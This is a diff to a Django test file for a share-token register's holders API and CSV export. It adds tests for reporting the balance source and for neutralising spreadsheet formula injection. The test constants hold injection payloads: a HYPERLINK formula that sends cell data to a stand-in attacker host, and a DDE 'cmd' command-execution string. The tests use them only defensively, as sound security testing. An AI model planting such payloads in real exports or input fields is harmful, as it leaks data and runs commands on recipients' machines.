@@ -24,7 +24,12 @@ from tokens.models import (
     ShareToken,
     ShareTokenStatus,
 )
-from tokens.services.register import REGISTER_HEADERS
+from tokens.services.register import (
+    REGISTER_HEADERS,
+    SOURCE_ALLOTMENTS,
+    SOURCE_CHAIN,
+    SOURCE_LABELS,
+)
 from users.models import UserAccount, UserProfile
 from wallets.models import Wallet
 from whitelist.models import WhitelistEntry, WhitelistStatus
@@ -36,6 +41,13 @@ TREASURY = Web3.to_checksum_address("0x" + "b2" * 20)
 SHARED = Web3.to_checksum_address("0x" + "c3" * 20)
 STRANGER = Web3.to_checksum_address("0x" + "d4" * 20)
 RESIDENCE = "12 Register Street, Sydney NSW 2000"
+FORMULA_NAME = '=HYPERLINK("http://attacker.test/"&A2&B2,"Open")'
+FORMULA_ADDRESS = "-2+3+cmd|' /C calc'!A0"
+FORMULA_LABEL = "@SUM(1+1)*cmd"
+
+
+def _raise():
+    raise RuntimeError("rpc timeout")
 
 
 def _account(email, name, residence=""):
@@ -109,9 +121,12 @@ class RegisterTestBase(APITestCase):
         return Wallet.objects.create(user_account=account, address=address, chain="base")
 
     def _balances(self, mapping):
+        return self._reader(lambda contract, address: mapping[address])
+
+    def _reader(self, side_effect):
         service = patch("tokens.services.register.ShareTokenService").start()
         self.addCleanup(patch.stopall)
-        service.return_value.get_token_balance.side_effect = lambda contract, address: mapping[address]
+        service.return_value.get_token_balance.side_effect = side_effect
         return service
 
 
@@ -188,10 +203,10 @@ class RegisterExportTest(RegisterTestBase):
         self.assertEqual(rows[0], REGISTER_HEADERS)
         body = {row[0]: row for row in rows[1:]}
         self.assertEqual(body["Mary Member"][1], RESIDENCE)
-        self.assertEqual(body["Mary Member"][3:6], ["Member", "REG", "100"])
-        self.assertEqual(body["Mary Member"][7:], ["Active", "250.00"])
+        self.assertEqual(body["Mary Member"][3:7], ["Member", "REG", "100", SOURCE_LABELS[SOURCE_CHAIN]])
+        self.assertEqual(body["Mary Member"][8:], ["Active", "250.00"])
         self.assertEqual(body["Company treasury"][1], "")
-        self.assertEqual(body["Company treasury"][8], "")
+        self.assertEqual(body["Company treasury"][9], "")
 
     def test_the_residential_address_never_reaches_the_api(self):
         member_account = _account("member@example.test", "Mary Member", RESIDENCE)
@@ -216,6 +231,66 @@ class RegisterExportTest(RegisterTestBase):
         message = log.info.call_args[0][0]
         self.assertIn("1 rows", message)
         self.assertIn(f"requested by user {self.owner.pk}", message)
+
+
+class RegisterTruthTest(RegisterTestBase):
+    def test_one_unreadable_balance_never_drops_a_member_from_the_register(self):
+        account = _account("pat@example.test", "Pat Partial", RESIDENCE)
+        wallet = self._wallet(account, MEMBER)
+        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
+        self._allot(MEMBER, 100)
+        self._allot(TREASURY, 40)
+        self._reader(lambda contract, address: 40 if address == TREASURY else _raise())
+
+        holders = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/").json()
+
+        self.assertEqual(holders["totalHolders"], 2)
+        self.assertEqual({row["address"] for row in holders["holders"]}, {MEMBER, TREASURY})
+        self.assertEqual({row["source"] for row in holders["holders"]}, {SOURCE_ALLOTMENTS})
+        self.assertEqual({row["percentage"] for row in holders["holders"]}, {71.43, 28.57})
+
+    def test_a_register_that_is_not_chain_confirmed_says_so_on_every_csv_row(self):
+        self._allot(MEMBER, 100)
+        self._allot(TREASURY, 40)
+        self._reader(lambda contract, address: 40 if address == TREASURY else _raise())
+
+        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")
+
+        rows = list(csv.reader(io.StringIO(response.content.decode())))
+        self.assertEqual(rows[0][6], "Balance source")
+        self.assertEqual([row[6] for row in rows[1:]], [SOURCE_LABELS[SOURCE_ALLOTMENTS]] * 2)
+
+    @patch("tokens.services.register.logger")
+    def test_an_export_that_is_not_chain_confirmed_is_logged_as_a_warning(self, log):
+        self._allot(MEMBER, 100)
+        self._reader(lambda contract, address: _raise())
+
+        self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")
+
+        self.assertIn("is not confirmed on chain", log.warning.call_args[0][0])
+
+    def test_a_name_or_address_that_opens_like_a_formula_is_neutralised_in_the_csv(self):
+        account = _account("evil@example.test", FORMULA_NAME, FORMULA_ADDRESS)
+        wallet = self._wallet(account, MEMBER)
+        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
+        self._allot(MEMBER, 100)
+        self._balances({MEMBER: 100})
+
+        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")
+
+        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
+        self.assertEqual(row[0], f"'{FORMULA_NAME}")
+        self.assertEqual(row[1], f"'{FORMULA_ADDRESS}")
+
+    def test_a_treasury_label_that_opens_like_a_formula_is_neutralised_in_the_csv(self):
+        WhitelistEntry.objects.create(address=TREASURY, label=FORMULA_LABEL, status=WhitelistStatus.ACTIVE)
+        self._allot(TREASURY, 50)
+        self._balances({TREASURY: 50})
+
+        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")
+
+        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
+        self.assertEqual(row[0], f"'{FORMULA_LABEL}")
 
 
 class RegisterIsolationTest(RegisterTestBase):
